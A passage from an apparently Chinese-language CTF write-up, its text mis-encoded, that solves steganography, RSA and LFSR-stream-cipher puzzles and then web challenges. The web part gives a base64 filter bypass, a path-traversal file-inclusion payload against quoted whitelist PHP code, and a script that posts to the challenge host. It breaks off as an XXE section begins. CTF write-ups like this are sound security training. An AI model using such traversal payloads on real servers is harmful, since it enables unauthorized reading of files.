class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line"># -*- coding:utf<span class="number">-8</span> -*-</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line">from PIL <span class="keyword">import</span> Image</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">im = Image.<span class="built_in">open</span>(<span class="string">"f1.png"</span>).convert(<span class="string">"L"</span>)</span><br><span class="line"></span><br><span class="line">im2 = Image.<span class="built_in">open</span>(<span class="string">"f2.png"</span>).convert(<span class="string">"L"</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">width</span>=im.<span class="built_in">size</span>[<span class="number">0</span>]  #å›¾ç‰‡å®½</span><br><span class="line"></span><br><span class="line"><span class="built_in">height</span>=im.<span class="built_in">size</span>[<span class="number">1</span>] #å›¾ç‰‡é«˜</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">dd=<span class="string">''</span></span><br><span class="line"></span><br><span class="line">flag1=<span class="string">''</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">for</span> x in range(<span class="number">0</span>,<span class="built_in">width</span>):</span><br><span class="line"></span><br><span class="line">    <span class="built_in">for</span> y in range(<span class="number">0</span>,<span class="built_in">height</span>):</span><br><span class="line"></span><br><span class="line">        data  = im .getpixel((x,y)) </span><br><span class="line"></span><br><span class="line">        data2 = im2.getpixel((x,y))</span><br><span class="line"></span><br><span class="line">        <span class="built_in">if</span>(data!=<span class="number">255</span> <span class="keyword">or</span> data2!=<span class="number">255</span>):</span><br><span class="line"></span><br><span class="line">            dd=dd+str(data-data2)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="built_in">for</span> i in range (<span class="keyword">int</span>(len(dd)/<span class="number">8</span>)):</span><br><span class="line"></span><br><span class="line">    <span class="keyword">word</span> = dd[i*<span class="number">8</span>:(i+<span class="number">1</span>)*<span class="number">8</span>]</span><br><span class="line"></span><br><span class="line">    <span class="keyword">word</span> = <span class="keyword">int</span>(<span class="keyword">word</span>,<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">    flag1 +=chr(<span class="keyword">int</span>(<span class="keyword">word</span>))</span><br><span class="line"></span><br><span class="line">missing_padding = <span class="number">4</span> - len(flag1)%<span class="number">4</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">if</span> missing_padding:</span><br><span class="line"></span><br><span class="line">    flag1+= <span class="string">'='</span>*missing_padding</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">flag = base64.b64decode(flag1)</span><br><span class="line"></span><br><span class="line">pic = <span class="built_in">open</span>(<span class="string">'flag.png'</span>,<span class="string">'wb'</span>)</span><br><span class="line"></span><br><span class="line">pic.<span class="built_in">write</span>(flag)</span><br><span class="line"></span><br><span class="line">pic.<span class="built_in">close</span>()</span><br></pre></td></tr></table></figure><p>å¾—åˆ°ä¸€å¼ å›¾ç‰‡ï¼Œä½†æ˜¯æ‰“ä¸å¼€ï¼Œçœ‹ä»–çš„åå…­è¿›åˆ¶æ•°æ®å‘ç°æ–‡ä»¶å¤´è¢«æ”¹äº†ã€‚æ”¹å›æ¥åå¾—åˆ°ä¸€å¼ äºŒç»´ç ï¼Œæ‰«ç å¾—åˆ°flag<br><a href="https://xzfile.aliyuncs.com/media/upload/picture/20190712113610-30f55f3a-a456-1.png" target="_blank" rel="noopener"><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190712113610-30f55f3a-a456-1.png" alt="img"></a></p><h2 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h2><h3 id="easy-RSA"><a href="#easy-RSA" class="headerlink" title="easy_RSA"></a>easy_RSA</h3><p>é¢˜ç›®æ–‡ä»¶æ˜¯public.pem å’Œ flag.encï¼Œå…ˆç”¨opensslæ‰“å¼€.pemæ–‡ä»¶<br>openssl rsa -pubin -text -modulus -in public.pem<br>å¾—åˆ°<br><a href="https://xzfile.aliyuncs.com/media/upload/picture/20190712113645-45c7b606-a456-1.png" target="_blank" rel="noopener"><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190712113645-45c7b606-a456-1.png" alt="img"></a></p><p>å…¶ä¸­ã€‚N=&gt;Modulusï¼Œe=&gt;Exponent<br>æ²¡æœ‰æ›´å¤šä¿¡æ¯ä¸ç®—æ³•äº†ï¼ŒçŒœæµ‹è¿™ä¸ªå¤§æ•°å¯ä»¥ç›´æ¥åˆ†è§£ï¼Œä¸Šyafuã€‚éšåç”¨rsatoolç”Ÿæˆ.pemæ–‡ä»¶ï¼Œå†ç”¨opensslè§£å¯†flag.encï¼Œå¾—åˆ°å­—ç¬¦ä¸²<br>}Y!s04tEP{ygraCl_f<br>æ …æ åŠ æ–¹å‘å³å¯å¾—åˆ°flagï¼Œ<br>rsatoolå’Œopensslçš„ä½¿ç”¨å‚è€ƒ<br><a href="https://www.cnblogs.com/Byqiyou/p/9410885.html" target="_blank" rel="noopener">https://www.cnblogs.com/Byqiyou/p/9410885.html</a></p><h3 id="å·æµä¸æ¯"><a href="#å·æµä¸æ¯" class="headerlink" title="å·æµä¸æ¯"></a>å·æµä¸æ¯</h3><p>é¢˜ç›®åŠ å¯†è„šæœ¬å’Œå¯†æ–‡<br>åŠ å¯†è„šæœ¬</p><figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">from</span> parameters import <span class="keyword">a</span></span><br><span class="line"></span><br><span class="line">def stream(init,size):</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(init) &lt; <span class="number">5</span>:</span><br><span class="line">        <span class="literal">return</span> init</span><br><span class="line">    <span class="built_in">result</span> = init[:<span class="number">5</span>]</span><br><span class="line">    <span class="keyword">for</span> index <span class="keyword">in</span> range(size<span class="number">-5</span>):</span><br><span class="line">        <span class="keyword">mid</span> = (<span class="built_in">result</span>[index] * <span class="keyword">a</span>[<span class="number">0</span>]) ^ (<span class="built_in">result</span>[index + <span class="number">1</span>] * <span class="keyword">a</span>[<span class="number">1</span>]) ^ (<span class="built_in">result</span>[index + <span class="number">2</span>] * <span class="keyword">a</span>[<span class="number">2</span>]) ^ (<span class="built_in">result</span>[index + <span class="number">3</span>] * <span class="keyword">a</span>[<span class="number">3</span>]) ^ (<span class="built_in">result</span>[index+<span class="number">4</span>] * <span class="keyword">a</span>[<span class="number">4</span>])</span><br><span class="line">        <span class="built_in">result</span>.append(<span class="keyword">mid</span>)</span><br><span class="line">    <span class="literal">return</span> <span class="built_in">result</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">'flag'</span>,<span class="string">'r'</span>) <span class="keyword">as</span> f:</span><br><span class="line">        flag = f.readline().strip()</span><br><span class="line">    plain = <span class="string">''</span>.join(bin(ord(i))[<span class="number">2</span>:].rjust(<span class="number">8</span>,<span class="string">'0'</span>) <span class="keyword">for</span> i <span class="keyword">in</span> flag)</span><br><span class="line">    key = stream([<span class="number">1</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">1</span>],<span class="built_in">len</span>(plain))</span><br><span class="line">    cipher = <span class="string">''</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="built_in">len</span>(plain)):</span><br><span class="line">        cipher += str(int(plain[i]) ^ key[i])</span><br><span class="line">    print cipher</span><br></pre></td></tr></table></figure><p>é¦–å…ˆï¼Œæ ¹æ®flagå‰äº”ä¸ªå­—ç¬¦â€œflag{â€å’Œå¯†æ–‡ï¼Œå¼‚æˆ–å¯ä»¥å¾—åˆ°keyçš„å‰å››åä¸ªå€¼ï¼Œç„¶åçˆ†ç ´å¾—åˆ°a</p><figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">import base64</span><br><span class="line"></span><br><span class="line">def stream(init,size):</span><br><span class="line">    key=[<span class="number">1</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">0</span>]</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">2</span>):</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">2</span>):</span><br><span class="line">            <span class="keyword">for</span> k <span class="keyword">in</span> range(<span class="number">2</span>):</span><br><span class="line">                <span class="keyword">for</span> p <span class="keyword">in</span> range(<span class="number">2</span>):</span><br><span class="line">                    <span class="keyword">for</span> q <span class="keyword">in</span> range(<span class="number">2</span>):</span><br><span class="line">                        <span class="keyword">a</span>=[i,j,k,p,q]</span><br><span class="line">                        <span class="built_in">result</span> = init[:<span class="number">5</span>]</span><br><span class="line">                        <span class="keyword">for</span> index <span class="keyword">in</span> range(size<span class="number">-5</span>):</span><br><span class="line">                            <span class="keyword">mid</span> = (<span class="built_in">result</span>[index] * <span class="keyword">a</span>[<span class="number">0</span>]) ^ (<span class="built_in">result</span>[index + <span class="number">1</span>] * <span class="keyword">a</span>[<span class="number">1</span>]) ^ (<span class="built_in">result</span>[index + <span class="number">2</span>] * <span class="keyword">a</span>[<span class="number">2</span>]) ^ (<span class="built_in">result</span>[index + <span class="number">3</span>] * <span class="keyword">a</span>[<span class="number">3</span>]) ^ (<span class="built_in">result</span>[index+<span class="number">4</span>] * <span class="keyword">a</span>[<span class="number">4</span>])</span><br><span class="line">                            <span class="built_in">result</span>.append(<span class="keyword">mid</span>)</span><br><span class="line">                        <span class="keyword">if</span> <span class="built_in">result</span>==key:</span><br><span class="line">                            print(<span class="keyword">a</span>)</span><br><span class="line">                            break</span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line"></span><br><span class="line">    flag = <span class="string">"flag&#123;"</span></span><br><span class="line">    plain = <span class="string">''</span>.join(bin(ord(i))[<span class="number">2</span>:].rjust(<span class="number">8</span>,<span class="string">'0'</span>) <span class="keyword">for</span> i <span class="keyword">in</span> flag)</span><br><span class="line">    stream([<span class="number">1</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">1</span>],<span class="built_in">len</span>(plain))</span><br></pre></td></tr></table></figure><p>å¾—åˆ°a=[1, 0, 0, 1, 0]<br>ç„¶åæ ¹æ®åŠ å¯†è„šæœ¬ï¼Œè·å¾—keyã€‚ç„¶åkeyä¸å¯†æ–‡å¼‚æˆ–å¾—åˆ°flag</p><figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">def stream(init,size):</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(init) &lt; <span class="number">5</span>:</span><br><span class="line">        <span class="literal">return</span> init</span><br><span class="line">    <span class="built_in">result</span> = init[:<span class="number">5</span>]</span><br><span class="line">    <span class="keyword">for</span> index <span class="keyword">in</span> range(size<span class="number">-5</span>):</span><br><span class="line">        <span class="keyword">mid</span> = (<span class="built_in">result</span>[index] * <span class="keyword">a</span>[<span class="number">0</span>]) ^ (<span class="built_in">result</span>[index + <span class="number">1</span>] * <span class="keyword">a</span>[<span class="number">1</span>]) ^ (<span class="built_in">result</span>[index + <span class="number">2</span>] * <span class="keyword">a</span>[<span class="number">2</span>]) ^ (<span class="built_in">result</span>[index + <span class="number">3</span>] * <span class="keyword">a</span>[<span class="number">3</span>]) ^ (<span class="built_in">result</span>[index+<span class="number">4</span>] * <span class="keyword">a</span>[<span class="number">4</span>])</span><br><span class="line">        <span class="built_in">result</span>.append(<span class="keyword">mid</span>)</span><br><span class="line">    <span class="literal">return</span> <span class="built_in">result</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    <span class="keyword">a</span>=[<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>]</span><br><span class="line">    cipher = <span class="string">'111111000010111011011010011110000100111111010110000000100100110000001100011010111000000100100011100100010111110010101000100100011100000101011001111011101001101000111011000010000000011010000111111000111101011110111010'</span></span><br><span class="line">    flag=<span class="string">''</span></span><br><span class="line">    key = stream([<span class="number">1</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">1</span>],<span class="built_in">len</span>(cipher))</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="built_in">len</span>(cipher)):</span><br><span class="line">        flag += str(int(cipher[i]) ^ key[i])</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,<span class="built_in">len</span>(flag),<span class="number">8</span>):</span><br><span class="line"></span><br><span class="line">        print(chr(int(flag[i:i+<span class="number">8</span>],<span class="number">2</span>)),<span class="keyword">end</span>=<span class="string">""</span>)</span><br></pre></td></tr></table></figure><h2 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h2><h3 id="base-1"><a href="#base-1" class="headerlink" title="base_1"></a>base_1</h3><p><a href="https://xzfile.aliyuncs.com/media/upload/picture/20190712114951-1a406990-a458-1.png" target="_blank" rel="noopener"><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190712114951-1a406990-a458-1.png" alt="img"></a></p><p>è¾“å…¥<br><a href="http://45.76.51.219:8050/?base=bXlmbGFn" target="_blank" rel="noopener">http://45.76.51.219:8050/?base=bXlmbGFn</a><br>å¾—åˆ°å›æ˜¾<br>ä¸èƒ½è¾“å…¥bXlmbGFnï¼<br>ä½†ç»è¿‡æµ‹è¯•ï¼Œå‘ç°è¢«åŠ å¯†åçš„base64å­—ç¬¦ä¸²è§£å¯†æ—¶ä¼¼ä¹ä¼šèˆå¼ƒå¯†æ–‡æœ«å°¾å¤šä½™çš„å­—ç¬¦ï¼ˆå–ä½™4åå¤šå‡ºæ¥çš„å­—ç¬¦ï¼‰ï¼Œäºæ˜¯è¿™é¢˜å°±ä¸éš¾ç»•è¿‡äº†ï¼Œ<br>æœ€ç»ˆpayloadï¼š<br><a href="http://45.76.51.219:8050/?base=bXlmbGFn1" target="_blank" rel="noopener">http://45.76.51.219:8050/?base=bXlmbGFn1</a><br>å¾—åˆ°flag</p><h3 id="truncation"><a href="#truncation" class="headerlink" title="truncation"></a>truncation</h3><p>è¿›å…¥ç½‘ç«™ï¼Œf12ï¼Œå‘ç°æ³¨é‡Šï¼š<br>è¿›å…¥sorce.phpå‘ç°æºç ï¼š</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php"><span class="class"><span class="keyword">class</span> <span class="title">kind</span></span></span></span><br><span class="line"><span class="php">&#123;</span></span><br><span class="line"><span class="php"><span class="keyword">public</span> <span class="keyword">static</span> <span class="function"><span class="keyword">function</span> <span class="title">checkFile</span><span class="params">(&amp;$page)</span></span></span></span><br><span class="line"><span class="php">&#123;</span></span><br><span class="line"><span class="php">        $whitelist = [<span class="string">"source"</span>=&gt;<span class="string">"source.php"</span>,<span class="string">"aa"</span>=&gt;<span class="string">"aa.php"</span>];</span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php">        <span class="keyword">if</span> (! <span class="keyword">isset</span>($page) || !is_string($page)) &#123;</span></span><br><span class="line"><span class="php">        <span class="keyword">echo</span> <span class="string">"you can't see it"</span>;</span></span><br><span class="line"><span class="php">        <span class="keyword">return</span> <span class="keyword">false</span>;</span></span><br><span class="line"><span class="php">        &#125;</span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php">        <span class="keyword">if</span> (in_array($page, $whitelist)) &#123;</span></span><br><span class="line"><span class="php">        <span class="keyword">return</span> <span class="keyword">true</span>;</span></span><br><span class="line"><span class="php">        &#125;</span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php">        $_page = mb_substr(</span></span><br><span class="line"><span class="php">        $page,</span></span><br><span class="line"><span class="php">        <span class="number">0</span>,</span></span><br><span class="line"><span class="php">        mb_strpos($page . <span class="string">'?'</span>, <span class="string">'?'</span>)</span></span><br><span class="line"><span class="php">        );</span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php">        <span class="keyword">if</span> (in_array($_page, $whitelist)) &#123;</span></span><br><span class="line"><span class="php">        <span class="keyword">return</span> <span class="keyword">true</span>;</span></span><br><span class="line"><span class="php">        &#125;</span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php">        $_page = urldecode($page);</span></span><br><span class="line"><span class="php">        $_page = mb_substr(</span></span><br><span class="line"><span class="php">        $_page,</span></span><br><span class="line"><span class="php">        <span class="number">0</span>,</span></span><br><span class="line"><span class="php">        mb_strpos($_page . <span class="string">'?'</span>, <span class="string">'?'</span>)</span></span><br><span class="line"><span class="php">        );</span></span><br><span class="line"><span class="php">        <span class="keyword">if</span> (in_array($_page, $whitelist)) &#123;</span></span><br><span class="line"><span class="php">        <span class="keyword">return</span> <span class="keyword">true</span>;</span></span><br><span class="line"><span class="php">        &#125;</span></span><br><span class="line"><span class="php">        <span class="keyword">echo</span> <span class="string">"you can't see it"</span>;</span></span><br><span class="line"><span class="php">        <span class="keyword">return</span> <span class="keyword">false</span>;</span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php">    <span class="keyword">if</span> (! <span class="keyword">empty</span>($_REQUEST[<span class="string">'file'</span>])</span></span><br><span class="line"><span class="php">        &amp;&amp; is_string($_REQUEST[<span class="string">'file'</span>])</span></span><br><span class="line"><span class="php">        &amp;&amp; kind::checkFile($_REQUEST[<span class="string">'file'</span>])</span></span><br><span class="line"><span class="php">    ) &#123;</span></span><br><span class="line"><span class="php">        <span class="keyword">include</span> $_REQUEST[<span class="string">'file'</span>];</span></span><br><span class="line"><span class="php">        <span class="keyword">exit</span>;</span></span><br><span class="line"><span class="php">    &#125; <span class="keyword">else</span> &#123;</span></span><br><span class="line"><span class="php">       <span class="keyword">echo</span> <span class="string">"&lt;h&gt;Look carefully and you will find the answer.&lt;/h&gt;&lt;br&gt;"</span>;</span></span><br><span class="line"><span class="php">    &#125;  </span></span><br><span class="line"><span class="php"><span class="meta">?&gt;</span></span></span><br></pre></td></tr></table></figure><p>å…ˆè¿›å…¥click.phpï¼Œå‘ç°ï¼šflag is not here, and flag in flag.php å¾—åˆ°äº†ï¬‚agçš„ä½ç½®ï¼Œé‚£ä¹ˆåº”è¯¥æ˜¯è€ƒä»»æ„æ–‡ä»¶åŒ…å«æ¼æ´<br>å®¡è®¡ä»£ç å¾—åˆ°ï¼š<br>è¦è®¾å®špageçš„å€¼ï¼Œä¸”å†…å®¹è¦åœ¨whiteListä¸­<br>mb_substr($page,0,mb_strpos(â€‹$page.â€™?â€™,â€™?â€™))<br>è¡¨ç¤ºæˆªå–pageä¸­ï¼Ÿä¹‹å‰çš„å†…å®¹ æ¥ç€å¯¹$pageè¿›è¡Œä¸€æ¬¡URLdecodeä¹‹åï¼Œå†åˆ¤æ–­ä¸€æ¬¡ã€‚æœ€åï¬leçš„å€¼ä¸ºä¸€ä¸ªå­—ç¬¦ä¸² ä¸” checkï¬leè¿”å›çœŸå€¼ å°±èƒ½åŒ…å«æ–‡ä»¶ï¬le<br>æ‰€ä»¥æœ€ç»ˆpayloadï¼š<br><a href="http://47.110.227.208:8003/index.php?file=source.php?../../flag.php" target="_blank" rel="noopener">http://47.110.227.208:8003/index.php?file=source.php?../../flag.php</a><br>å¾—åˆ°ä¸€ä¸ªçŒœå¯†ç çš„ç•Œé¢</p><figure class="highlight xquery"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span></span><br><span class="line"><span class="xml"></span><span class="xml"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span></span><br><span class="line"><span class="xml"></span><span class="xml"><span class="tag">&lt;<span class="name">title</span>&gt;</span>çŒœå¯†ç <span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><span class="xml"></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><span class="xml"></span></span><br><span class="line"><span class="xml"></span><span class="xml"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="comment">&lt;!-- </span></span></span><br><span class="line"><span class="xml">session_start();</span></span><br><span class="line"><span class="xml">$_SESSION['pwd']=time();</span></span><br><span class="line"><span class="xml">if (isset ($_POST['password'])) </span><span class="xquery">&#123;</span></span><br><span class="line"><span class="xquery">        <span class="keyword">if</span> (<span class="variable">$_POST</span>[<span class="string">'pwd'</span>] == <span class="variable">$_SESSION</span>[<span class="string">'pwd'</span>])</span></span><br><span class="line"><span class="xquery">                die(<span class="string">'Flag:'</span>.<span class="variable">$flag</span>);</span></span><br><span class="line"><span class="xquery">        <span class="keyword">else</span>&#123;</span></span><br><span class="line"><span class="xquery">                print <span class="string">'&lt;p&gt;çŒœæµ‹é”™è¯¯.&lt;/p&gt;'</span>;</span></span><br><span class="line"><span class="xquery">                <span class="variable">$_SESSION</span>[<span class="string">'pwd'</span>]=time().time();</span></span><br><span class="line"><span class="xquery">        &#125;</span><span class="xml"></span></span><br><span class="line"><span class="xml">&#125;</span></span><br><span class="line"><span class="xml">--&gt;</span></span><br><span class="line"><span class="xml"></span><span class="xml"><span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">"index.php"</span> <span class="attr">method</span>=<span class="string">"post"</span>&gt;</span></span></span><br><span class="line"><span class="xml">å¯†ç ï¼š<span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"text"</span> <span class="attr">name</span>=<span class="string">"pwd"</span>/&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"submit"</span> <span class="attr">value</span>=<span class="string">"çŒœå¯†ç "</span>/&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><span class="xml"></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><span class="xml"></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span></span><br></pre></td></tr></table></figure><p>éœ€è¦postä¸€ä¸ªèµ‹å€¼äº†çš„passwordå’Œä¸€ä¸ªå’ŒæœåŠ¡å™¨æ—¶é—´çš„å€¼ç›¸åŒçš„pwdï¼Œè„šæœ¬å¦‚ä¸‹</p><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">import time</span><br><span class="line">from bs4 import BeautifulSoup       <span class="comment">#htmlè§£æå™¨</span></span><br><span class="line">url=<span class="string">"http://47.110.227.208:8003/index.php?file=source.php?../../flag.php"</span>    <span class="comment">#ç›®æ ‡url</span></span><br><span class="line"></span><br><span class="line">session=requests.session()          <span class="comment">#è·å–ä¸€ä¸ªsessionå¯¹è±¡</span></span><br><span class="line">response=session.get(url)</span><br><span class="line">html=response.text                  <span class="comment">#è¿”å›çš„é¡µé¢</span></span><br><span class="line">soup=BeautifulSoup(html,'html.parser')</span><br><span class="line"></span><br><span class="line">formData=&#123;<span class="string">"password"</span>:<span class="string">"123"</span>,<span class="string">"pwd"</span>:<span class="string">"int(time.time())"</span>&#125;<span class="comment">#æ„å»ºä¸€ä¸ªformDataï¼Œç”¨äºä¼ æˆ‘ä»¬çš„</span></span><br><span class="line">re2=session.post(url,data=formData)<span class="comment">#postè¿‡å»</span></span><br><span class="line"></span><br><span class="line">if(<span class="string">"çŒœæµ‹é”™è¯¯"</span> not  in re2.text):</span><br><span class="line">    print(re2.text)</span><br></pre></td></tr></table></figure><p>å‘ç°æ— æ³•è·å¾—flagï¼Œåæ¥å‘ç°pwdèµ‹å€¼ä¸ºç©ºå¯ä»¥è·å¾—flagï¼Œå¯èƒ½æ˜¯$_SESSION[â€˜pwdâ€™]=time();æ²¡æœ‰æ‰§è¡ŒæˆåŠŸã€‚</p><h3 id="Simple-XXE"><a href="#Simple-XXE" class="headerlink" title="Simple XXE"></a>Simple XXE</h3><p>é¦–å…ˆï¼Œäº†è§£ä¸€ä¸‹XXEï¼Œï¼ˆxmlå¤–éƒ¨å®ä½“æ³¨å…¥æ¼æ´ï¼‰<br>å‚è€ƒæ–‡ç« ï¼š<a href="https://www.cnblogs.com/cui0x01/p/8823690.html" target="_blank" rel="noopener">https://www.cnblogs.com/cui0x01/p/8823690.html</a><br>ï¼ˆç„¶åè·Ÿè¿™ä¸ªæ–‡ç« èµ°2333ï¼‰<br>é¦–å…ˆf12çœ‹åˆ°dom.phpå­˜åœ¨XXEï¼Œäºæ˜¯æ„é€ 